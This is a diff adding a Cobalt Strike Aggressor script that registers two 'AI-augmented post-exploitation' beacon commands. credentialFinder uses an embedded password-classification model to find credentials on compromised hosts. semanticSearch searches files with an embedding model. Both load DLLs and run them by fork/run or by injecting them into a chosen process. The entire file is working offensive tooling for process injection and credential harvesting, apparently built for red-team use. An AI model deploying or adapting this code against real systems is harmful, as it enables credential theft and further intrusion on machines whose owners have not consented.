@@ -1,0 +1,179 @@
+debug(7);
+
+# --------------------
+# Retrieve the content of the user provided file.
+#
+# @param path - the path to the file.
+# return = a byte array containing the file content
+# --------------------
+sub get_file_content {
+    local('$handle $path $data');
+    $path = $1;
+    $handle = openf($path);
+    $data = readb($handle, -1);
+    closef($handle);
+    return $data;
+}
+
+# --------------------
+# Define the credentialFinder command
+# 
+# @param beacon_id - the id of the current beacon
+# @param arch - the architecture of the postex job
+# @param pid - the pid of the target process
+# @param root_path - path to begin search
+# @param threshold - threshold similarity
+# @param reference_string - reference semantic string
+# --------------------
+alias semanticSearch {
+    local('$arch $argument_string $beacon_id $callback $postex_dll_path $postex_dll $packed_arguments $pid $root_path $threshold $reference_string');
+        $beacon_id = $1;
+        $arch = $2;
+        $pid = $3;
+		$root_path = $4;
+		$threshold = $6;
+		$reference_string = $5;
+        
+        # find the correct path to the postex DLL
+        if($arch eq "x64") {
+            $postex_dll_path = getFileProper(script_resource("."), "dist", "x64", "Release", "semanticSearch.dll");
+        } else if ($arch eq "x86") {
+            $postex_dll_path = getFileProper(script_resource("."), "dist", "Release", "semanticSearch.dll");
+        } else{
+            berror($1, "Invalid architecture");
+            return;
+        }
+
+        # check whether to fork/run or inject
+        if($pid eq "-1") {
+            $pid = $null;
+            btask($1, "Using fork/run to execute postex job");
+        } else {
+            btask($1, "Injecting postex job into $pid");
+        }
+
+        # check the postex dll exists
+        if (!-isFile $postex_dll_path) {
+            berror($1, "Cannot find $postex_dll_path");
+            return;
+        }
+
+		# check if threshold was set, otherwise use a default value
+		if($threshold is $null){
+			$threshold = ".4"; 
+		}else{
+			$threshold = $threshold / 100.0; # convert percent to float
+		}
+
+		# check if threshold was set, otherwise use a default value
+		if($reference_string is $null){
+            berror($1, "Invalid reference string.");
+            return;
+		}
+
+        # get the postex DLL content
+        $postex_dll = get_file_content($postex_dll_path);
+        if ($postex_dll is $null) {
+            berror($1, "Failed to retrieve DLL content");
+            return;
+        }
+
+        # pack arguments
+        $packed_arguments = bof_pack($beacon_id, "zzz", $root_path,  $threshold, $reference_string);
+        
+        # run the postex task...
+        beacon_execute_postex_job($beacon_id, $pid, $postex_dll, $packed_arguments, $callback);
+        
+        # example: run the postex task (without the callback) 
+        #beacon_execute_postex_job($beacon_id, $pid, $postex_dll, $packed_arguments, $null);
+}
+
+# --------------------
+# Define the credentialFinder command
+# 
+# @param beacon_id - the id of the current beacon
+# @param arch - the architecture of the postex job
+# @param pid - the pid of the target process
+# @param root_path - path to begin search
+# @param threshold - threshold confidence for classification
+# --------------------
+alias credentialFinder {
+    local('$arch $argument_string $beacon_id $callback $postex_dll_path $postex_dll $packed_arguments $pid $root_path $threshold');
+        $beacon_id = $1;
+        $arch = $2;
+        $pid = $3;
+		$root_path = $4;
+		$threshold = $5;
+        
+        # find the correct path to the postex DLL
+        if($arch eq "x64") {
+            $postex_dll_path = getFileProper(script_resource("."), "dist", "x64", "Release", "credentialFinder.dll");
+        } else if ($arch eq "x86") {
+            $postex_dll_path = getFileProper(script_resource("."), "dist", "Release", "credentialFinder.dll");
+        } else{
+            berror($1, "Invalid architecture");
+            return;
+        }
+
+        # check whether to fork/run or inject
+        if($pid eq "-1") {
+            $pid = $null;
+            btask($1, "Using fork/run to execute postex job");
+        } else {
+            btask($1, "Injecting postex job into $pid");
+        }
+
+        # check the postex dll exists
+        if (!-isFile $postex_dll_path) {
+            berror($1, "Cannot find $postex_dll_path");
+            return;
+        }
+
+		# check if threshold was set, otherwise use a default value
+		if($threshold is $null){
+			$threshold = ".4"; 
+		}else{
+			$threshold = $threshold / 100.0; # convert percent to float
+		}
+
+        # get the postex DLL content
+        $postex_dll = get_file_content($postex_dll_path);
+        if ($postex_dll is $null) {
+            berror($1, "Failed to retrieve DLL content");
+            return;
+        }
+
+        # pack arguments
+        $packed_arguments = bof_pack($beacon_id, "zz", $root_path, $threshold);
+        
+        # run the postex task...
+        beacon_execute_postex_job($beacon_id, $pid, $postex_dll, $packed_arguments, $callback);
+        
+        # example: run the postex task (without the callback) 
+        #beacon_execute_postex_job($beacon_id, $pid, $postex_dll, $packed_arguments, $null);
+}
+
+# --------------------
+# Register the postex-kit command
+# --------------------
+beacon_command_group(
+	"ai_dlls",
+	"AI/ML Postex DLLs",
+	"[EXPERIMENTAL] AI-augmented post-exploitation tools."
+);
+
+beacon_command_register(
+	"credentialFinder", 
+	"[EXPERIMENTAL] BiLSTM password classification model embedded in a DLL to facilitate credential discovery.",
+	"Fork/Run: credentialFinder [arch] -1 [root_path] [threshold >1 - 99]\n" . 
+	"Inject:   credentialFinder [arch] [pid] [root_path] [threshold >1 - 99]",
+	"ai_dlls"
+);
+
+beacon_command_register(
+	"semanticSearch", 
+	"[EXPERIMENTAL] Integrated embedding-model for context-aware text-based search.",
+	"Fork/Run: semanticSearch [arch] -1 [root_path] [reference_string] [threshold >1 - 99]\n" . 
+	"Inject:   semanticSearch [arch] [pid] [root_path] [reference_string] [threshold >1 - 99]\n",
+	"ai_dlls"
+);
